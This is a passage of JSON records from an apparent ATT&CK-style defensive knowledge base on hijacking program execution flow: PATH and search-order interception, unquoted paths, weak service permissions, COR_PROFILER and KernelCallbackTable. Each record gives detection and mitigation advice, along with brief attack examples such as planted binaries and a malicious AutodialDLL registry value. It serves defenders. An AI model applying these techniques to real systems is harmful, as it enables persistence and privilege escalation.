<code>DYLD_INSERT_LIBRARIES</code>, as well as the commands to implement these changes.\n\nMonitor processes for unusual activity (e.g., a process that does not use the network begins to do so). Track library metadata, such as a hash, and compare libraries that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.","platforms":["Linux","macOS"],"dataSources":["File: File Creation","Command: Command Execution","Module: Module Load","Process: Process Creation","File: File Modification"],"mitigations":[{"id":"M1028","name":"Operating System Configuration","description":"When System Integrity Protection (SIP) is enabled in macOS, the aforementioned environment variables are ignored when executing protected binaries. Third-party applications can also leverage Apple’s Hardened Runtime, ensuring these environment variables are subject to imposed restrictions. <a href=\"https://developer.apple.com/documentation/security/hardened_runtime\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Apple Developer Doco Hardened Runtime)</a> Admins can add restrictions to applications by setting the setuid and/or setgid bits, use entitlements, or have a __RESTRICT segment in the Mach-O binary."},{"id":"M1038","name":"Execution Prevention","description":"Adversaries may use new payloads to execute this technique. Identify and block potentially malicious software executed through hijacking by using application control solutions also capable of blocking libraries loaded by legitimate software."}]},{"id":"T1574.007","name":"Path Interception by PATH Environment Variable","description":"Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. The PATH environment variable contains a list of directories (User and System) that the OS searches sequentially through in search of the binary that was called from a script or the command line. \n\nAdversaries can place a malicious program in an earlier entry in the list of directories stored in the PATH environment variable, resulting in the operating system executing the malicious binary rather than the legitimate binary when it searches sequentially through that PATH listing.\n\nFor example, on Windows if an adversary places a malicious program named \"net.exe\" in <code>C:\\example path</code>, which by default precedes <code>C:\\Windows\\system32\\net.exe</code> in the PATH environment variable, when \"net\" is executed from the command-line the <code>C:\\example path</code> will be called instead of the system's legitimate executable at <code>C:\\Windows\\system32\\net.exe</code>. Some methods of executing a program rely on the PATH environment variable to determine the locations that are searched when the path for the program is not given, such as executing programs from a Command and Scripting Interpreter. <a href=\"https://www.expressvpn.com/blog/cybersecurity-lessons-a-path-vulnerability-in-windows/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ExpressVPN PATH env Windows 2021)</a>\n\nAdversaries may also directly modify the $PATH variable specifying the directories to be searched.  An adversary can modify the <code>$PATH</code> variable to point to a directory they have write access. When a program using the $PATH variable is called, the OS searches the specified directory and executes the malicious binary. On macOS, this can also be performed through modifying the $HOME variable. These variables can be modified using the command-line, launchctl, Unix Shell Configuration Modification, or modifying the <code>/etc/paths.d</code> folder contents. <a href=\"https://www.uptycs.com/blog/new-poc-exploit-backdoor-malware\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: uptycs Fake POC linux malware 2023)</a> <a href=\"https://www.cyberciti.biz/faq/appleosx-bash-unix-change-set-path-environment-variable/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: nixCraft macOS PATH variables)</a> <a href=\"https://www.elastic.co/guide/en/security/7.17/prebuilt-rule-7-16-4-modification-of-environment-variable-via-launchctl.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Rules macOS launchctl 2022)</a>","detection":"Monitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Monitor the executing process for process executable paths that are named for partial directories. Monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as \"findstr,\" \"net,\" and \"python\"). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious.\n\nData and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.","platforms":["Linux","macOS","Windows"],"dataSources":["File: File Creation","Windows Registry: Windows Registry Key Modification","Process: Process Creation"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Ensure that proper permissions and directory access control are set to deny users the ability to write files to the top-level directory <code>C:</code> and system directories, such as <code>C:\\Windows\\</code>, to reduce places where malicious files could be placed for execution. Require that all executables be placed in write-protected directories."},{"id":"M1038","name":"Execution Prevention","description":"Adversaries will likely need to place new binaries in locations to be executed through this weakness. Identify and block potentially malicious software executed path interception by using application control tools, like Windows Defender Application Control, AppLocker, or Software Restriction Policies where appropriate. <a href=\"https://www.sans.org/reading-room/whitepapers/application/application-whitelisting-panacea-propaganda-33599\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SANS Application Whitelisting)</a> <a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Windows Defender Application Control)</a> <a href=\"https://blogs.jpcert.or.jp/en/2016/01/windows-commands-abused-by-attackers.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Windows Commands JPCERT)</a> <a href=\"https://apps.nsa.gov/iaarchive/library/ia-guidance/tech-briefs/application-whitelisting-using-microsoft-applocker.cfm\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NSA MS AppLocker)</a> <a href=\"https://docs.microsoft.com/en-us/previous-versions/technet-magazine/cc510322(v=msdn.10)?redirectedfrom=MSDN\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Application Lockdown)</a> (Citation: Microsoft Using Software Restriction )"},{"id":"M1047","name":"Audit","description":"Find and eliminate path interception weaknesses in program configuration files, scripts, the PATH environment variable, services, and in shortcuts by surrounding PATH variables with quotation marks when functions allow for them. Be aware of the search order Windows uses for executing or loading binaries and use fully qualified paths wherever appropriate.\n\nClean up old Windows Registry keys when software is uninstalled to avoid keys with no associated legitimate binaries. Periodically search for and correct or report path interception weaknesses on systems that may have been introduced using custom or available tools that report software using insecure path configurations. <a href=\"https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft CreateProcess)</a> <a href=\"https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-security?redirectedfrom=MSDN\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Dynamic-Link Library Security)</a> <a href=\"https://skanthak.homepage.t-online.de/sentinel.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Vulnerability and Exploit Detector)</a>"}]},{"id":"T1574.008","name":"Path Interception by Search Order Hijacking","description":"Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.\n\nSearch order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike DLL search order hijacking, the search order differs depending on the method that is used to execute the program. <a href=\"https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft CreateProcess)</a> <a href=\"https://docs.microsoft.com/en-us/previous-versions//cc723564(v=technet.10)?redirectedfrom=MSDN#XSLTsection127121120120\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Windows NT Command Shell)</a> <a href=\"https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft WinExec)</a> However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.\n\nFor example, \"example.exe\" runs \"cmd.exe\" with the command-line argument <code>net user</code>. An adversary may place a program called \"net.exe\" within the same directory as example.exe, \"net.exe\" will be run instead of the Windows system utility net. In addition, if an adversary places a program called \"net.com\" in the same directory as \"net.exe\", then <code>cmd.exe /C net user</code> will execute \"net.com\" instead of \"net.exe\" due to the order of executable extensions defined under PATHEXT. <a href=\"https://docs.microsoft.com/en-us/previous-versions//fd7hxfdd(v=vs.85)?redirectedfrom=MSDN\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Environment Property)</a>\n\nSearch order hijacking is also a common practice for hijacking DLL loads and is covered in DLL.","detection":"Monitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Monitor the executing process for process executable paths that are named for partial directories. Monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as \"findstr,\" \"net,\" and \"python\"). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious.\n\nData and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.","platforms":["Windows"],"dataSources":["Process: Process Creation","File: File Modification","File: File Creation"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Ensure that proper permissions and directory access control are set to deny users the ability to write files to the top-level directory <code>C:</code> and system directories, such as <code>C:\\Windows\\</code>, to reduce places where malicious files could be placed for execution. Require that all executables be placed in write-protected directories."},{"id":"M1038","name":"Execution Prevention","description":"Adversaries will likely need to place new binaries in locations to be executed through this weakness. Identify and block potentially malicious software executed path interception by using application control tools, like Windows Defender Application Control, AppLocker, or Software Restriction Policies where appropriate. <a href=\"https://www.sans.org/reading-room/whitepapers/application/application-whitelisting-panacea-propaganda-33599\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SANS Application Whitelisting)</a> <a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Windows Defender Application Control)</a> <a href=\"https://blogs.jpcert.or.jp/en/2016/01/windows-commands-abused-by-attackers.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Windows Commands JPCERT)</a> <a href=\"https://apps.nsa.gov/iaarchive/library/ia-guidance/tech-briefs/application-whitelisting-using-microsoft-applocker.cfm\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NSA MS AppLocker)</a> <a href=\"https://docs.microsoft.com/en-us/previous-versions/technet-magazine/cc510322(v=msdn.10)?redirectedfrom=MSDN\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Application Lockdown)</a> (Citation: Microsoft Using Software Restriction )"},{"id":"M1047","name":"Audit","description":"Find and eliminate path interception weaknesses in program configuration files, scripts, the PATH environment variable, services, and in shortcuts by surrounding PATH variables with quotation marks when functions allow for them. Be aware of the search order Windows uses for executing or loading binaries and use fully qualified paths wherever appropriate.\n\nClean up old Windows Registry keys when software is uninstalled to avoid keys with no associated legitimate binaries. Periodically search for and correct or report path interception weaknesses on systems that may have been introduced using custom or available tools that report software using insecure path configurations. <a href=\"https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft CreateProcess)</a> <a href=\"https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-security?redirectedfrom=MSDN\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Dynamic-Link Library Security)</a> <a href=\"https://skanthak.homepage.t-online.de/sentinel.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Vulnerability and Exploit Detector)</a>"}]},{"id":"T1574.009","name":"Path Interception by Unquoted Path","description":"Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.\n\nService paths <a href=\"https://docs.microsoft.com/en-us/windows-hardware/drivers/install/hklm-system-currentcontrolset-services-registry-tree\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft CurrentControlSet Services)</a> and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., <code>C:\\unsafe path with space\\program.exe</code> vs. <code>\"C:\\safe path with space\\program.exe\"</code>). <a href=\"https://isc.sans.edu/diary/Help+eliminate+unquoted+path+vulnerabilities/14464\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Help eliminate unquoted path)</a> (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is <code>C:\\program files\\myapp.exe</code>, an adversary may create a program at <code>C:\\program.exe</code> that will be run instead of the intended program. <a href=\"https://securityboulevard.com/2018/04/windows-privilege-escalation-unquoted-services/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Windows Unquoted Services)</a> <a href=\"https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Windows Privilege Escalation Guide)</a>\n\nThis technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.","detection":"Monitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Monitor the executing process for process executable paths that are named for partial directories. Monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as \"findstr,\" \"net,\" and \"python\"). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious.\n\nData and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.","platforms":["Windows"],"dataSources":["File: File Modification","File: File Creation","Process: Process Creation"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Ensure that proper permissions and directory access control are set to deny users the ability to write files to the top-level directory <code>C:</code> and system directories, such as <code>C:\\Windows\\</code>, to reduce places where malicious files could be placed for execution. Require that all executables be placed in write-protected directories."},{"id":"M1038","name":"Execution Prevention","description":"Adversaries will likely need to place new binaries in locations to be executed through this weakness. Identify and block potentially malicious software executed path interception by using application control tools, like Windows Defender Application Control, AppLocker, or Software Restriction Policies where appropriate. <a href=\"https://www.sans.org/reading-room/whitepapers/application/application-whitelisting-panacea-propaganda-33599\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SANS Application Whitelisting)</a> <a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Windows Defender Application Control)</a> <a href=\"https://blogs.jpcert.or.jp/en/2016/01/windows-commands-abused-by-attackers.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Windows Commands JPCERT)</a> <a href=\"https://apps.nsa.gov/iaarchive/library/ia-guidance/tech-briefs/application-whitelisting-using-microsoft-applocker.cfm\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NSA MS AppLocker)</a> <a href=\"https://docs.microsoft.com/en-us/previous-versions/technet-magazine/cc510322(v=msdn.10)?redirectedfrom=MSDN\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Application Lockdown)</a> (Citation: Microsoft Using Software Restriction )"},{"id":"M1047","name":"Audit","description":"Find and eliminate path interception weaknesses in program configuration files, scripts, the PATH environment variable, services, and in shortcuts by surrounding PATH variables with quotation marks when functions allow for them. Be aware of the search order Windows uses for executing or loading binaries and use fully qualified paths wherever appropriate.\n\nClean up old Windows Registry keys when software is uninstalled to avoid keys with no associated legitimate binaries. Periodically search for and correct or report path interception weaknesses on systems that may have been introduced using custom or available tools that report software using insecure path configurations. <a href=\"https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft CreateProcess)</a> <a href=\"https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-security?redirectedfrom=MSDN\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Dynamic-Link Library Security)</a> <a href=\"https://skanthak.homepage.t-online.de/sentinel.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Vulnerability and Exploit Detector)</a>"}]},{"id":"T1574.010","name":"Services File Permissions Weakness","description":"Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.","detection":"Look for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.\n\nLook for abnormal process call trees from typical processes and services and for execution of other commands that could relate to Discovery or other adversary techniques.","platforms":["Windows"],"dataSources":["File: File Modification","File: File Creation","Process: Process Creation","Service: Service Metadata"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit privileges of user accounts and groups so that only authorized administrators can interact with service changes and service binary target path locations. Deny execution from user directories such as file download directories and temp directories where able."},{"id":"M1047","name":"Audit","description":"Use auditing tools capable of detecting file system permissions abuse opportunities on systems within an enterprise and correct them. Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for service file system permissions weaknesses. <a href=\"https://github.com/mattifestation/PowerSploit\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Powersploit)</a>"},{"id":"M1052","name":"User Account Control","description":"Turn off UAC's privilege elevation for standard users <code>[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System]</code>to automatically deny elevation requests, add: <code>\"ConsentPromptBehaviorUser\"=dword:00000000</code>. Consider enabling installer detection for all users by adding: <code>\"EnableInstallerDetection\"=dword:00000001</code>. This will prompt for a password for installation and also log the attempt. To disable installer detection, instead add: <code>\"EnableInstallerDetection\"=dword:00000000</code>. This may prevent potential elevation of privileges through exploitation during the process of UAC detecting the installer, but will allow the installation process to continue without being logged. <a href=\"https://seclists.org/fulldisclosure/2015/Dec/34\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Executable Installers are Vulnerable)</a>"}]},{"id":"T1574.011","name":"Services Registry Permissions Weakness","description":"Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Flaws in the permissions for Registry keys related to services can allow adversaries to redirect the originally specified executable to one they control, launching their own code when a service starts. Windows stores local service configuration information in the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  PowerShell, or Reg. Access to Registry keys is controlled through access control lists and user permissions. <a href=\"https://docs.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights?redirectedfrom=MSDN\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Registry Key Security)</a> <a href=\"https://www.bleepingcomputer.com/tutorials/how-malware-hides-as-a-service/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: malware_hides_service)</a>\n\nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).\n\nAdversaries may also alter other Registry keys in the service’s Registry tree. For example, the <code>FailureCommand</code> key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted. <a href=\"https://trustedsignal.blogspot.com/2014/05/kansa-service-related-collectors-and.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kansa Service related collectors)</a> <a href=\"https://x.com/r0wdy_/status/936365549553991680\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Tweet Registry Perms Weakness)</a>\n\nThe <code>Performance</code> key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL. <a href=\"https://docs.microsoft.com/en-us/windows-hardware/drivers/install/hklm-system-currentcontrolset-services-registry-tree\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: microsoft_services_registry_tree)</a> If the <code>Performance</code> key is not already present and if an adversary-controlled user has the <code>Create Subkey</code> permission, adversaries may create the <code>Performance</code> key in the service’s Registry tree to point to a malicious DLL. <a href=\"https://itm4n.github.io/windows-registry-rpceptmapper-eop/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: insecure_reg_perms)</a>\n\nAdversaries may also add the <code>Parameters</code> key, which can reference malicious drivers file paths. This technique has been identified to be a method of abuse by configuring DLL file paths within the <code>Parameters</code> key of a given services registry configuration. By placing and configuring the <code>Parameters</code> key to reference a malicious DLL, adversaries can ensure that their code is loaded persistently whenever the associated service or library is invoked.\n\nFor example, the registry path <a href=\"https://www.mdsec.co.uk/2022/10/autodialdlling-your-way/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MDSec)</a> <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WinSock2\\Parameters</code> <a href=\"https://www.hexacorn.com/blog/2015/01/13/beyond-good-ol-run-key-part-24/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: hexacorn)</a> <a href=\"https://www.gendigital.com/blog/insights/research/operation-dragon-castling-apt-group-targeting-betting-companies\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: gendigital)</a> contains the <code>AutodiaDLL</code> value, which specifies the DLL to be loaded for autodial funcitionality. An adversary could set the <code>AutodiaDLL</code> to point to a hijacked or malicious DLL:\n\n<code>\"AutodialDLL\"=\"c:\\temp\\foo.dll\"</code>\n\nThis ensures persistence, as it causes the DLL (in this case, foo.dll) to be loaded each time the Winsock 2 library is invoked.","detection":"Service changes are reflected in the Registry. Modification to existing services should not occur frequently. If a service binary path or failure parameters are changed to values that are not typical for that service and does not correlate with software updates, then it may be due to malicious activity. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current service information. <a href=\"https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Autoruns for Windows)</a> Look for changes to services that do not correlate with known software, patch cycles, etc. Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.\n\nMonitor processes and command-line arguments for actions that could be done to modify services. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Services may also be changed through Windows system management tools such as Windows Management Instrumentation and PowerShell, so additional logging may need to be configured to gather the appropriate data.","platforms":["Windows"],"dataSources":["Windows Registry: Windows Registry Key Modification","Service: Service Modification","Command: Command Execution","Process: Process Creation"],"mitigations":[{"id":"M1024","name":"Restrict Registry Permissions","description":"Ensure proper permissions are set for Registry hives to prevent users from modifying keys for system components that may lead to privilege escalation."}]},{"id":"T1574.012","name":"COR_PROFILER","description":"Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR. <a href=\"https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/profiling/profiling-overview\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Profiling Mar 2017)</a> <a href=\"https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/ee471451(v=vs.100)\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft COR_PROFILER Feb 2013)</a>\n\nThe COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a Component Object Model (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable. <a href=\"https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/ee471451(v=vs.100)\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft COR_PROFILER Feb 2013)</a>\n\nAdversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex: Bypass User Account Control) if the victim .NET process executes at a higher permission level, as well as to hook and impair defenses provided by .NET processes. <a href=\"https://redcanary.com/blog/blue-mockingbird-cryptominer/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: RedCanary Mockingbird May 2020)</a> <a href=\"https://redcanary.com/blog/cor_profiler-for-persistence/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Red Canary COR_PROFILER May 2020)</a> <a href=\"https://offsec.almond.consulting/UAC-bypass-dotnet.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Almond COR_PROFILER Apr 2019)</a> <a href=\"https://github.com/OmerYa/Invisi-Shell\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub OmerYa Invisi-Shell)</a> <a href=\"https://web.archive.org/web/20170720041203/http://subt0x10.blogspot.com/2017/05/subvert-clr-process-listing-with-net.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: subTee .NET Profilers May 2017)</a>","detection":"For detecting system and user scope abuse of the COR_PROFILER, monitor the Registry for changes to COR_ENABLE_PROFILING, COR_PROFILER, and COR_PROFILER_PATH that correspond to system and user environment variables that do not correlate to known developer tools. Extra scrutiny should be placed on suspicious modification of these Registry keys by command line tools like wmic.exe, setx.exe, and Reg, monitoring for command-line arguments indicating a change to COR_PROFILER variables may aid in detection. For system, user, and process scope abuse of the COR_PROFILER, monitor for new suspicious unmanaged profiling DLLs loading into .NET processes shortly after the CLR causing abnormal process behavior. <a href=\"https://redcanary.com/blog/cor_profiler-for-persistence/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Red Canary COR_PROFILER May 2020)</a> Consider monitoring for DLL files that are associated with COR_PROFILER environment variables.","platforms":["Windows"],"dataSources":["Process: Process Creation","Windows Registry: Windows Registry Key Modification","Module: Module Load","Command: Command Execution"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit the privileges of user accounts so that only authorized administrators can edit system environment variables."},{"id":"M1024","name":"Restrict Registry Permissions","description":"Ensure proper permissions are set for Registry hives to prevent users from modifying keys associated with COR_PROFILER."},{"id":"M1038","name":"Execution Prevention","description":"Identify and block potentially malicious unmanaged COR_PROFILER profiling DLLs  by using application control solutions like AppLocker that are capable of auditing and/or blocking unapproved DLLs. <a href=\"http://www.sans.org/reading-room/whitepapers/application/application-whitelisting-panacea-propaganda-33599\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Beechey 2010)</a> <a href=\"https://blogs.jpcert.or.jp/en/2016/01/windows-commands-abused-by-attackers.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Windows Commands JPCERT)</a> <a href=\"https://apps.nsa.gov/iaarchive/library/ia-guidance/tech-briefs/application-whitelisting-using-microsoft-applocker.cfm\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NSA MS AppLocker)</a>"}]},{"id":"T1574.013","name":"KernelCallbackTable","description":"Adversaries may abuse the <code>KernelCallbackTable</code> of a process to hijack its execution flow in order to run their own payloads. <a href=\"https://blog.malwarebytes.com/threat-intelligence/2022/01/north-koreas-lazarus-apt-leverages-windows-update-client-github-in-latest-campaign/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Lazarus APT January 2022)</a> (Citation: FinFisher exposed ) The <code>KernelCallbackTable</code> can be found in the Process Environment Block (PEB) and is initialized to an array of graphic functions available to a GUI process once <code>user32.dll</code> is loaded. <a href=\"https://modexp.wordpress.com/2019/05/25/windows-injection-finspy/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Windows Process Injection KernelCallbackTable)</a>\n\nAn adversary may hijack the execution flow of a process using the <code>KernelCallbackTable</code> by replacing an original callback function with a malicious payload. Modifying callback functions can be achieved in various ways involving related behaviors such as Reflective Code Loading or Process Injection into another process.\n\nA pointer to the memory address of the <code>KernelCallbackTable</code> can be obtained by locating the PEB (ex: via a call to the <code>NtQueryInformationProcess()</code> Native API function). <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NtQueryInformationProcess)</a> Once the pointer is located, the <code>KernelCallbackTable</code> can be duplicated, and a function in the table (e.g., <code>fnCOPYDATA</code>) set to the address of a malicious payload (ex: via <code>WriteProcessMemory()</code>). The PEB is then updated with the new address of the table. Once the tampered function is invoked, the malicious payload will be triggered. <a href=\"https://blog.malwarebytes.com/threat-intelligence/2022/01/north-koreas-lazarus-apt-leverages-windows-update-client-github-in-latest-campaign/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Lazarus APT January 2022)</a>\n\nThe tampered function is typically invoked using a Windows message. After the process is hijacked and malicious code is executed, the <code>KernelCallbackTable</code> may also be restored to its original state by the rest of the malicious payload. <a href=\"https://blog.malwarebytes.com/threat-intelligence/2022/01/north-koreas-lazarus-apt-leverages-windows-update-client-github-in-latest-campaign/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Lazarus APT January 2022)</a> Use of the <code>KernelCallbackTable</code> to hijack execution flow may evade detection from security products since the execution can be masked under a legitimate process.","detection":"Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, 